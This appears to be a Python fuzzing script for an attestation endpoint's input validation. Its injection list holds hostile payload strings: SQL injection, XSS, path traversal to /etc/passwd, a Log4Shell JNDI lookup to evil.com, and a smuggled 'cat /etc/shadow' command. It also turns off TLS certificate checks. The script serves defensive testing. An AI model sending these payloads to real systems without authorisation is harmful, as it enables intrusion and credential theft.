// SPDX-License-Identifier: MIT
# SPDX-License-Identifier: MIT

import json
import time
import sqlite3
import requests
from datetime import datetime
from typing import Dict, List, Tuple, Any
import urllib3

# Suppress SSL warnings for testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DB_PATH = "fuzz_results.db"

class AttestEndpointFuzzer:
    def __init__(self, base_url: str = "http://localhost:5000"):
        self.base_url = base_url.rstrip('/')
        self.endpoint = f"{self.base_url}/attest/submit"
        self.session = requests.Session()
        self.results = []

        # Initialize database
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute('''
                CREATE TABLE IF NOT EXISTS fuzz_results (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TEXT,
                    payload_type TEXT,
                    payload_data TEXT,
                    response_code INTEGER,
                    response_body TEXT,
                    response_time_ms REAL,
                    classification TEXT,
                    notes TEXT
                )
            ''')

    def generate_payloads(self) -> List[Tuple[str, Dict[str, Any], str]]:
        """Generate 100+ malformed payloads for testing"""
        payloads = []

        # Valid baseline for reference
        payloads.append(("baseline_valid", {
            "node_id": "test_node_123",
            "challenge": "valid_challenge_data",
            "proof": "valid_proof_response",
            "timestamp": int(time.time())
        }, "Valid payload for baseline"))

        # Missing required fields
        base_payload = {"node_id": "test", "challenge": "test", "proof": "test", "timestamp": 1234567890}
        for field in base_payload.keys():
            partial = base_payload.copy()
            del partial[field]
            payloads.append((f"missing_{field}", partial, f"Missing required field: {field}"))

        # Wrong data types
        type_tests = [
            ("node_id", [123, None, [], {}, True]),
            ("challenge", [456, None, [], {}, False]),
            ("proof", [789, None, [], {}, True]),
            ("timestamp", ["not_int", None, [], {}, "string"])
        ]

        for field, bad_values in type_tests:
            for i, bad_val in enumerate(bad_values):
                test_payload = base_payload.copy()
                test_payload[field] = bad_val
                payloads.append((f"wrong_type_{field}_{i}", test_payload, f"Wrong type for {field}: {type(bad_val).__name__}"))

        # Oversized inputs
        huge_string = "x" * 10000
        oversized_tests = [
            ("node_id", huge_string),
            ("challenge", huge_string),
            ("proof", huge_string * 5)  # 50k chars
        ]

        for field, big_val in oversized_tests:
            test_payload = base_payload.copy()
            test_payload[field] = big_val
            payloads.append((f"oversized_{field}", test_payload, f"Oversized {field}: {len(str(big_val))} chars"))

        # Injection attempts
        injection_strings = [
            "'; DROP TABLE nodes; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/}",
            "{{7*7}}",
            "\x00\x01\x02\x03",
            "../../../windows/system32/cmd.exe",
            "eval(base64_decode('bWFsaWNpb3VzX2NvZGU='))",
            "1' UNION SELECT * FROM users--",
            "admin'/*",
            "\"; cat /etc/shadow; echo \"",
            "%27%20OR%201%3D1%20--%20",
            "javascript:alert(1)",
            "{{config.items()}}"
        ]

        for inj_str in injection_strings:
            for field in ["node_id", "challenge", "proof"]:
                test_payload = base_payload.copy()
                test_payload[field] = inj_str
                payloads.append((f"injection_{field}", test_payload, f"Injection test in {field}"))

        # Edge case values
        edge_cases = [
            ("empty_strings", {"node_id": "", "challenge": "", "proof": "", "timestamp": 0}),
            ("unicode_chaos", {"node_id": "🚀💀🔥", "challenge": "тест данные", "proof": "العربية", "timestamp": 1234567890}),
            ("negative_timestamp", {"node_id": "test", "challenge": "test", "proof": "test", "timestamp": -999999}),
            ("future_timestamp", {"node_id": "test", "challenge": "test", "proof": "test", "timestamp": 9999999999}),
            ("boolean_fields", {"node_id": True, "challenge": False, "proof": True, "timestamp": True}),
            ("nested_objects", {"node_id": {"nested": "value"}, "challenge": [1,2,3], "proof": {"proof": "nested"}, "timestamp": 1234567890}),
            ("null_values", {"node_id": None, "challenge": None, "proof": None, "timestamp": None})
        ]

        for case_name, case_payload in edge_cases:
            payloads.append((case_name, case_payload, f"Edge case: {case_name}"))

        # Malformed JSON scenarios (will be handled as raw strings)
        malformed_json_tests = [
            ("invalid_json", '{"node_id": "test", "incomplete":', "Incomplete JSON"),
            ("trailing_comma", '{"node_id": "test",}', "Trailing comma"),
            ("unquoted_keys", '{node_id: "test"}', "Unquoted keys"),
            ("single_quotes", "{'node_id': 'test'}", "Single quotes instead of double"),
            ("duplicate_keys", '{"node_id": "test", "node_id": "duplicate"}', "Duplicate keys")
        ]

        for case_name, json_str, desc in malformed_json_tests:
            payloads.append((case_name, json_str, desc))

        # Binary and special content
        binary_tests = [
            ("binary_data", b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR", "PNG header bytes"),
            ("random_bytes", bytes(range(256)), "All byte values 0-255"),
        ]

        for case_name, binary_data, desc in binary_tests:
            payloads.append((case_name, binary_data, desc))

        # Extra fields
        extra_fields_payload = base_payload.copy()
        extra_fields_payload.update({
            "extra_field": "should_not_be_here",
            "admin": True,
            "debug": True,
            "bypass": "security",
            "internal_flag": "test"
        })
        payloads.append(("extra_fields", extra_fields_payload, "Extra unexpected fields"))

        return payloads

    def send_payload(self, payload_type: str, payload_data: Any, description: str) -> Dict:
        """Send a single payload and record results"""
        start_time = time.time()

        try:
            headers = {"Content-Type": "application/json"}

            if isinstance(payload_data, (bytes, str)) and not isinstance(payload_data, dict):
                # Raw data for malformed JSON tests
                if isinstance(payload_data, str):
                    data = payload_data.encode('utf-8')
                else:
                    data = payload_data
                response = self.session.post(self.endpoint, data=data, headers=headers, timeout=10, verify=False)
            else:
                # Normal JSON payload
                response = self.session.post(self.endpoint, json=payload_data, timeout=10, verify=False)

            response_time = (time.time() - start_time) * 1000

            # Try to get response text, handle encoding issues
            try:
                response_text = response.text
            except:
                response_text = str(response.content)

            result = {
                "payload_type": payload_type,
                "payload_data": str(payload_data),
                "response_code": response.status_code,
                "response_body": response_text[:1000],  # Truncate long responses
                "response_time_ms": response_time,
                "description": description,
                "classification": self.classify_response(response.status_code, response_text),
                "timestamp": datetime.now().isoformat()
            }

        except requests.exceptions.RequestException as e:
            result = {
                "payload_type": payload_type,
                "payload_data": str(payload_data),
                "response_code": 0,
                "response_body": f"Request failed: {str(e)}",
                "response_time_ms": (time.time() - start_time) * 1000,
                "description": description,
                "classification": "network_error",
                "timestamp": datetime.now().isoformat()
            }

        return result

    def classify_response(self, status_code: int, response_body: str) -> str:
        """Classify the response as validation error, bug, or other"""
        if status_code == 0:
            return "network_error"
        elif 200 <= status_code < 300:
            return "unexpected_success"
        elif status_code == 400:
            if any(keyword in response_body.lower() for keyword in ["validation", "required", "invalid", "missing"]):
                return "proper_validation"
            else:
                return "generic_400"
        elif status_code == 401:
            return "auth_error"
        elif status_code == 403:
            return "permission_error"
        elif status_code == 404:
            return "not_found"
        elif status_code == 405:
            return "method_not_allowed"
        elif 500 <= status_code < 600:
            if "traceback" in response_body.lower() or "error:" in response_body.lower():
                return "server_bug"
            else:
                return "generic_5xx"
        else:
            return f"other_status_{status_code}"

    def save_result(self, result: Dict):
        """Save result to database"""
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute('''
                INSERT INTO fuzz_results
                (timestamp, payload_type, payload_data, response_code, response_body,
                 response_time_ms, classification, notes)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                result["timestamp"],
                result["payload_type"],
                result["payload_data"],
                result["response_code"],
                result["response_body"],
                result["response_time_ms"],
                result["classification"],
                result["description"]
            ))

    def run_fuzzing(self):
        """Execute the full fuzzing campaign"""
        print(f"Starting fuzzing campaign against {self.endpoint}")
        payloads = self.generate_payloads()
        print(f"Generated {len(payloads)} test payloads")

        for i, (payload_type, payload_data, description) in enumerate(payloads, 1):
            print(f"[{i:3d}/{len(payloads)}] Testing: {payload_type}")

            result = self.send_payload(payload_type, payload_data, description)
            self.results.append(result)
            self.save_result(result)

            # Brief pause to avoid overwhelming the server
            time.sleep(0.1)

        print(f"Fuzzing completed. {len(self.results)} requests sent.")

    def generate_report(self) -> str:
        """Generate a structured report of findings"""
        if not self.results:
            return "No results to report."

        # Group results by classification
        classification_groups = {}
        for result in self.results:
            classification = result["classification"]
            if classification not in classification_groups:
                classification_groups[classification] = []
            classification_groups[classification].append(result)

        report = []
        report.append("=== ATTESTATION ENDPOINT FUZZING REPORT ===")
        report.append(f"Generated: {datetime.now().isoformat()}")
        report.append(f"Endpoint: {self.endpoint}")
        report.append(f"Total Payloads: {len(self.results)}")
        report.append("")

        # Summary by classification
        report.append("CLASSIFICATION SUMMARY:")
        for classification, results in sorted(classification_groups.items()):
            report.append(f"  {classification}: {len(results)} responses")
        report.append("")

        # Detailed findings for concerning classifications
        concerning_classifications = ["server_bug", "unexpected_success", "generic_5xx", "generic_400"]

        for classification in concerning_classifications:
            if classification in classification_groups:
                report.append(f"=== {classification.upper()} FINDINGS ===")
                for result in classification_groups[classification]:
                    report.append(f"Payload Type: {result['payload_type']}")
                    report.append(f"Description: {result['description']}")
                    report.append(f"Response Code: {result['response_code']}")
                    report.append(f"Response Time: {result['response_time_ms']:.2f}ms")
                    report.append(f"Response Body: {result['response_body'][:200]}...")
                    report.append("---")
                report.append("")

        # Response time analysis
        avg_response_time = sum(r["response_time_ms"] for r in self.results) / len(self.results)
        max_response_time = max(r["response_time_ms"] for r in self.results)
        report.append(f"PERFORMANCE METRICS:")
        report.append(f"  Average Response Time: {avg_response_time:.2f}ms")
        report.append(f"  Maximum Response Time: {max_response_time:.2f}ms")
        report.append("")

        # Security recommendations
        report.append("SECURITY OBSERVATIONS:")
        if "server_bug" in classification_groups:
            report.append("  ⚠️  Server-side errors detected - review application logs")
        if "unexpected_success" in classification_groups:
            report.append("  ⚠️  Unexpected successful responses - validate business logic")
        if "generic_400" in classification_groups or "generic_5xx" in classification_groups:
            report.append("  ℹ️   Generic error responses - consider more specific error handling")
        if "proper_validation" in classification_groups:
            report.append(f"  ✅ Proper validation detected in {len(classification_groups['proper_validation'])} cases")

        return "\n".join(report)

    def export_results(self, filename: str = None):
        """Export results to JSON file"""
        if filename is None:
            filename = f"fuzz_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)

        print(f"Results exported to {filename}")

def main():
    """Main execution function"""
    import sys

    base_url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"

    fuzzer = AttestEndpointFuzzer(base_url)

    try:
        fuzzer.run_fuzzing()
        report = fuzzer.generate_report()

        # Save report to file
        report_file = f"fuzz_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(report_file, 'w') as f:
            f.write(report)

        print("\n" + "="*60)
        print(report)
        print("="*60)
        print(f"\nReport saved to: {report_file}")

        # Export detailed results
        fuzzer.export_results()

    except KeyboardInterrupt:
        print("\nFuzzing interrupted by user")
    except Exception as e:
        print(f"Error during fuzzing: {e}")

if __name__ == "__main__":
    main()
